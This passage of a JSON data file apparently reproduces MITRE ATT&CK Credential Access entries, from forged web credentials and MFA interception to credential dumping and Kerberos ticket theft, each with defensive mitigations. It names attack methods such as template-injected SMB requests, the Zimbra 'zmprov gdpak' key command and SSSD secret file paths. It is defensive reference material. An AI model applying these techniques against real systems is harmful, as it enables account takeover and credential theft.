          "content": "A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. Template Injection). The document can include, for example, a request similar to file[:]//[remote address]/Normal.dotm to trigger the SMB request."
        },
        {
          "type": "li",
          "content": "A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \\[remote address]\\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Block SMB traffic from exiting an enterprise network with egress filtering or by blocking TCP ports 139, 445 and UDP port 137. Filter or block WebDAV protocol traffic from exiting the network. If access to external resources over SMB and WebDAV is necessary, then traffic should be tightly limited with allowlisting.  "
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Use strong passwords to increase the difficulty of credential hashes from being cracked if they are obtained."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1606",
    "name": "Forge Web Credentials",
    "tactics": [{ "id": "TA0006", "name": "Credential Access" }],
    "subs": [
      { "id": "T1606.001", "name": "Web Cookies" },
      { "id": "T1606.002", "name": "SAML Tokens" }
    ],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may generate these credential materials in order to gain access to web resources. This differs from Steal Web Session Cookie, Steal Application Access Token, and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users."
        }
      ],
      [
        {
          "type": "text",
          "content": "The generation of web credentials often requires secret values, such as passwords, Private Keys, or other cryptographic seed values. Adversaries may also forge tokens by taking advantage of features such as the "
        },
        { "type": "code", "content": "AssumeRole" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "GetFederationToken" },
        {
          "type": "text",
          "content": " APIs in AWS, which allow users to request temporary security credentials (i.e., Temporary Elevated Cloud Access), or the "
        },
        { "type": "code", "content": "zmprov gdpak" },
        {
          "type": "text",
          "content": " command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain."
        }
      ],
      [
        {
          "type": "text",
          "content": "Once forged, adversaries may use these web credentials to access resources (ex: Use Alternate Authentication Material), which may bypass multi-factor and other authentication protection mechanisms. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Administrators should perform an audit of all access lists and the permissions they have been granted to access web applications and services. This should be done extensively on all resources in order to establish a baseline, followed up on with periodic audits of new or updated resources. Suspicious accounts/credentials should be investigated and removed."
            }
          ],
          [
            {
              "type": "text",
              "content": "Enable advanced auditing on ADFS. Check the success and failure audit options in the ADFS Management snap-in. Enable Audit Application Generated events on the AD FS farm via Group Policy Object."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict permissions and access to the AD FS server to only originate from privileged access workstations."
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "Software Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure browsers/applications to regularly delete persistent web credentials (such as cookies)."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that user accounts with administrative rights follow best practices, including use of privileged access workstations, Just in Time/Just Enough Administration (JIT/JEA), and strong authentication. Reduce the number of users that are members of highly privileged Directory Roles. In AWS environments, prohibit users from calling the "
            },
            { "type": "code", "content": "sts:GetFederationToken" },
            { "type": "text", "content": " API unless explicitly required." }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1056",
    "name": "Input Capture",
    "tactics": [
      { "id": "TA0009", "name": "Collection" },
      { "id": "TA0006", "name": "Credential Access" }
    ],
    "subs": [
      { "id": "T1056.001", "name": "Keylogging" },
      { "id": "T1056.002", "name": "GUI Input Capture" },
      { "id": "T1056.003", "name": "Web Portal Capture" },
      { "id": "T1056.004", "name": "Credential API Hooking" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture)."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1556",
    "name": "Modify Authentication Process",
    "tactics": [
      { "id": "TA0006", "name": "Credential Access" },
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0003", "name": "Persistence" }
    ],
    "subs": [
      { "id": "T1556.001", "name": "Domain Controller Authentication" },
      { "id": "T1556.002", "name": "Password Filter DLL" },
      { "id": "T1556.003", "name": "Pluggable Authentication Modules" },
      { "id": "T1556.004", "name": "Network Device Authentication" },
      { "id": "T1556.005", "name": "Reversible Encryption" },
      { "id": "T1556.006", "name": "Multi-Factor Authentication" },
      { "id": "T1556.007", "name": "Hybrid Identity" },
      { "id": "T1556.008", "name": "Network Provider DLL" }
    ],
    "version": "2.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Review authentication logs to ensure that mechanisms such as enforcement of MFA are functioning as intended."
            }
          ],
          [
            {
              "type": "text",
              "content": "Periodically review the hybrid identity solution in use for any discrepancies. For example, review all Pass Through Authentication (PTA) agents in the Azure Management Portal to identify any unwanted or unapproved ones. If ADFS is in use, review DLLs and executable files in the AD FS and Global Assembly Cache directories to ensure that they are signed by Microsoft. Note that in some cases binaries may be catalog-signed, which may cause the file to appear unsigned when viewing file properties."
            }
          ],
          [
            {
              "type": "text",
              "content": "Periodically review for new and unknown network provider DLLs within the Registry ("
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<NetworkProviderName>\\NetworkProvider\\ProviderPath"
            },
            {
              "type": "text",
              "content": "). Ensure only valid network provider DLLs are registered. The name of these can be found in the Registry key at "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order"
            },
            {
              "type": "text",
              "content": ", and have corresponding service subkey pointing to a DLL at "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentC ontrolSet\\Services\\<NetworkProviderName>\\NetworkProvider"
            },
            { "type": "text", "content": "." }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs. "
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory ("
            },
            { "type": "code", "content": "C:\\Windows\\System32\\" },
            {
              "type": "text",
              "content": " by default) of a domain controller and/or local computer with a corresponding entry in "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages"
            },
            { "type": "text", "content": ". " }
          ],
          [
            { "type": "text", "content": "Starting in Windows 11 22H2, the " },
            { "type": "code", "content": "EnableMPRNotifications" },
            {
              "type": "text",
              "content": " policy can be disabled through Group Policy or through a configuration service provider to prevent Winlogon from sending credentials to network providers."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            { "type": "text", "content": "Ensure that " },
            { "type": "code", "content": "AllowReversiblePasswordEncryption" },
            {
              "type": "text",
              "content": " property is set to disabled unless there are application requirements."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.   These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. "
            }
          ],
          [
            {
              "type": "text",
              "content": "Limit access to the root account and prevent users from modifying protected components through proper privilege separation (ex SELinux, grsecurity, AppArmor, etc.) and limiting Privilege Escalation opportunities."
            }
          ],
          [
            {
              "type": "text",
              "content": "Limit on-premises accounts with access to the hybrid identity solution in place. For example, limit Azure AD Global Administrator accounts to only those required, and ensure that these are dedicated cloud-only accounts rather than hybrid ones."
            }
          ]
        ]
      },
      {
        "id": "M1025",
        "name": "Privileged Process Integrity",
        "description": [
          [
            {
              "type": "text",
              "content": "Enabled features, such as Protected Process Light (PPL), for LSA."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            { "type": "text", "content": "Restrict write access to the " },
            {
              "type": "code",
              "content": "/Library/Security/SecurityAgentPlugins"
            },
            { "type": "text", "content": " directory." }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "Restrict Registry Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict Registry permissions to disallow the modification of sensitive Registry keys such as "
            },
            {
              "type": "code",
              "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order"
            },
            { "type": "text", "content": "." }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that proper policies are implemented to dictate the the secure enrollment and deactivation of authentication mechanisms, such as MFA, for user accounts."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1111",
    "name": "Multi-Factor Authentication Interception",
    "tactics": [{ "id": "TA0006", "name": "Credential Access" }],
    "subs": [],
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. "
        }
      ],
      [
        {
          "type": "text",
          "content": "If a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). "
        }
      ],
      [
        {
          "type": "text",
          "content": "Other methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users’ phones."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [{ "type": "text", "content": "Remove smart cards when not in use." }]
        ]
      }
    ]
  },
  {
    "id": "T1621",
    "name": "Multi-Factor Authentication Request Generation",
    "tactics": [{ "id": "TA0006", "name": "Credential Access" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries in possession of credentials to Valid Accounts may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account."
        }
      ],
      [
        {
          "type": "text",
          "content": "In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to \"MFA fatigue.\""
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1036",
        "name": "Account Use Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Enable account restrictions to prevent login attempts, and the subsequent 2FA/MFA service requests, from being initiated from suspicious locations or when the source of the login attempts do not match the location of the 2FA/MFA smart device. Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges."
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Implement more secure 2FA/MFA mechanisms in replacement of simple push or one-click 2FA/MFA options. For example, having users enter a one-time code provided by the login screen into the 2FA/MFA application or utilizing other out-of-band 2FA/MFA mechanisms (such as rotating code-based hardware tokens providing rotating codes that need an accompanying user pin) may be more secure. Furthermore, change default configurations and implement limits upon the maximum number of 2FA/MFA request prompts that can be sent to users in period of time."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Train users to only accept 2FA/MFA requests from login attempts they initiated, to review source location of the login attempt prompting the 2FA/MFA requests, and to report suspicious/unsolicited prompts."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1040",
    "name": "Network Sniffing",
    "tactics": [
      { "id": "TA0006", "name": "Credential Access" },
      { "id": "TA0007", "name": "Discovery" }
    ],
    "subs": [],
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data."
        }
      ],
      [
        {
          "type": "text",
          "content": "Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary."
        }
      ],
      [
        {
          "type": "text",
          "content": "Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities."
        }
      ],
      [
        {
          "type": "text",
          "content": "In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to. Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic. The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic."
        }
      ],
      [
        {
          "type": "text",
          "content": "On network devices, adversaries may perform network captures using Network Device CLI commands such as "
        },
        { "type": "code", "content": "monitor capture" },
        { "type": "text", "content": "." }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS."
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Use multi-factor authentication wherever possible."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Deny direct access of broadcasts and multicast sniffing, and prevent attacks such as LLMNR/NBT-NS Poisoning and SMB Relay"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "In cloud environments, ensure that users are not granted permissions to create or modify traffic mirrors unless this is explicitly required."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1003",
    "name": "OS Credential Dumping",
    "tactics": [{ "id": "TA0006", "name": "Credential Access" }],
    "subs": [
      { "id": "T1003.001", "name": "LSASS Memory" },
      { "id": "T1003.002", "name": "Security Account Manager" },
      { "id": "T1003.003", "name": "NTDS" },
      { "id": "T1003.004", "name": "LSA Secrets" },
      { "id": "T1003.005", "name": "Cached Domain Credentials" },
      { "id": "T1003.006", "name": "DCSync" },
      { "id": "T1003.007", "name": "Proc Filesystem" },
      { "id": "T1003.008", "name": "/etc/passwd and /etc/shadow" }
    ],
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information."
        }
      ],
      [
        {
          "type": "text",
          "content": "Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Manage the access control list for \"Replicating Directory Changes\" and other permissions associated with domain controller replication.   Consider adding users to the \"Protected Users\" Active Directory security group. This can help limit the caching of users' plaintext credentials."
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing. "
            }
          ]
        ]
      },
      {
        "id": "M1043",
        "name": "Credential Access Protection",
        "description": [
          [
            {
              "type": "text",
              "content": "With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.  It also does not protect against all forms of credential dumping. "
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure Domain Controller backups are properly secured."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider disabling or restricting NTLM. Consider disabling WDigest authentication."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that local administrator accounts have complex, unique passwords across all systems on the network."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Windows:Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers."
            }
          ],
          [
            {
              "type": "text",
              "content": "Linux:Scraping the passwords from memory requires root privileges. Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing such sensitive regions of memory."
            }
          ]
        ]
      },
      {
        "id": "M1025",
        "name": "Privileged Process Integrity",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1528",
    "name": "Steal Application Access Token",
    "tactics": [{ "id": "TA0006", "name": "Credential Access" }],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources."
        }
      ],
      [
        {
          "type": "text",
          "content": "Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS). OAuth is one commonly implemented framework that issues tokens to users for access to systems. Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment."
        }
      ],
      [
        {
          "type": "text",
          "content": "In Kubernetes environments, processes running inside a container communicate with the Kubernetes API server using service account tokens. If a container is compromised, an attacker may be able to steal the container’s token and thereby gain access to Kubernetes API commands."
        }
      ],
      [
        {
          "type": "text",
          "content": "Token theft can also occur through social engineering, in which case user action may be required to grant access. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow. An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token. The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls. Then, they can send a Spearphishing Link to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through Application Access Token."
        }
      ],
      [
        {
          "type": "text",
          "content": "Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens, allowing them to obtain new access tokens without prompting the user.  "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Administrators should audit all cloud and container accounts to ensure that they are necessary and that the permissions granted to them are appropriate.  Additionally, administrators should perform an audit of all OAuth applications and the permissions they have been granted to access organizational data. This should be done extensively on all applications in order to establish a baseline, followed up on with periodic audits of new or updated applications. Suspicious applications should be investigated and removed."
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "Restrict Web-Based Content",
        "description": [
          [
            {
              "type": "text",
              "content": "Administrators can block end-user consent to OAuth applications, disabling users from authorizing third-party apps through OAuth 2.0 and forcing administrative consent for all requests. They can also block end-user registration of applications by their users, to reduce risk. A Cloud Access Security Broker can also be used to ban applications."
            }
          ],
          [
            {
              "type": "text",
              "content": "Azure offers a couple of enterprise policy settings in the Azure Management Portal that may help:"
            }
          ],
          [
            {
              "type": "text",
              "content": "\"Users -> User settings -> App registrations: Users can register applications\" can be set to \"no\" to prevent users from registering new applications. \"Enterprise applications -> User settings -> Enterprise applications: Users can consent to apps accessing company data on their behalf\" can be set to \"no\" to prevent users from consenting to allow third-party multi-tenant applications"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Enforce role-based access control to limit accounts to the least privileges they require. A Cloud Access Security Broker (CASB) can be used to set usage policies and manage user permissions on cloud applications to prevent access to application access tokens. In Kubernetes applications, set \"automountServiceAccountToken: false\" in the YAML specification of pods that do not require access to service account tokens."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Users need to be trained to not authorize third-party applications they don’t recognize. The user should pay particular attention to the redirect URL: if the URL is a misspelled or convoluted sequence of words related to an expected service or SaaS application, the website is likely trying to spoof a legitimate service. Users should also be cautious about the permissions they are granting to apps. For example, offline access and access to read emails should excite higher suspicions because adversaries can utilize SaaS APIs to discover credentials and other sensitive communications."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1649",
    "name": "Steal or Forge Authentication Certificates",
    "tactics": [{ "id": "TA0006", "name": "Credential Access" }],
    "subs": [],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts."
        }
      ],
      [
        {
          "type": "text",
          "content": "Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files), misplaced certificate files (i.e. Unsecured Credentials), or directly from the Windows certificate store via various crypto APIs. With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names."
        }
      ],
      [
        {
          "type": "text",
          "content": "Abusing certificates for authentication credentials may enable other behaviors such as Lateral Movement. Certificate-related misconfigurations may also enable opportunities for Privilege Escalation, by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable Persistence via stealing or forging certificates that can be used as Valid Accounts for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish Persistence by forging arbitrary authentication certificates for the victim domain (known as \"golden\" certificates). Adversaries may also target certificates and related services in order to access other forms of credentials, such as Golden Ticket ticket-granting tickets (TGT) or NTLM plaintext."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure certificate authorities (CA) are properly secured, including treating CA servers (and other resources hosting CA certificates) as tier 0 assets. Harden abusable CA settings and attributes."
            }
          ],
          [
            {
              "type": "text",
              "content": "For example, consider disabling the usage of AD CS certificate SANs within relevant authentication protocol settings to enforce strict user mappings and prevent certificates from authenticating as other identifies. Also consider enforcing CA Certificate Manager approval for the templates that include SAN as an issuance requirement."
            }
          ]
        ]
      },
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Check and remediate unneeded existing authentication certificates as well as common abusable misconfigurations of CA settings and permissions, such as AD CS certificate enrollment permissions and published overly permissive certificate templates (which define available settings for created certificates). For example, available AD CS certificate templates can be checked via the Certificate Authority MMC snap-in ("
            },
            { "type": "code", "content": "certsrv.msc" },
            { "type": "text", "content": "). " },
            { "type": "code", "content": "certutil.exe" },
            {
              "type": "text",
              "content": " can also be used to examine various information within an AD CS CA database."
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider disabling old/dangerous authentication protocols (e.g. NTLM), as well as unnecessary certificate features, such as potentially vulnerable AD CS web and other enrollment server roles."
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure certificates as well as associated private keys are appropriately secured. Consider utilizing additional hardware credential protections such as trusted platform modules (TPM) or hardware security modules (HSM). Enforce HTTPS and enable Extended Protection forAuthentication."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1558",
    "name": "Steal or Forge Kerberos Tickets",
    "tactics": [{ "id": "TA0006", "name": "Credential Access" }],
    "subs": [
      { "id": "T1558.001", "name": "Golden Ticket" },
      { "id": "T1558.002", "name": "Silver Ticket" },
      { "id": "T1558.003", "name": "Kerberoasting" },
      { "id": "T1558.004", "name": "AS-REP Roasting" }
    ],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable Pass the Ticket. Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \"realms\", there are three basic participants: client, service, and Key Distribution Center (KDC). Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access."
        }
      ],
      [
        { "type": "text", "content": "On Windows, the built-in " },
        { "type": "code", "content": "klist" },
        {
          "type": "text",
          "content": " utility can be used to list and analyze cached Kerberos tickets."
        }
      ],
      [
        {
          "type": "text",
          "content": "Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts. On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in "
        },
        { "type": "code", "content": "/var/lib/sss/secrets/secrets.ldb" },
        {
          "type": "text",
          "content": " as well as the corresponding key located in "
        },
        { "type": "code", "content": "/var/lib/sss/secrets/.secrets.mkey" },
        {
          "type": "text",
          "content": ". Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for Pass the Ticket. The ccache file may also be converted into a Windows format using tools such as Kekeo."
        }
      ],
      [
        {
          "type": "text",
          "content": "Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the "
        },
        { "type": "code", "content": "/etc/krb5.conf" },
        { "type": "text", "content": " configuration file and the " },
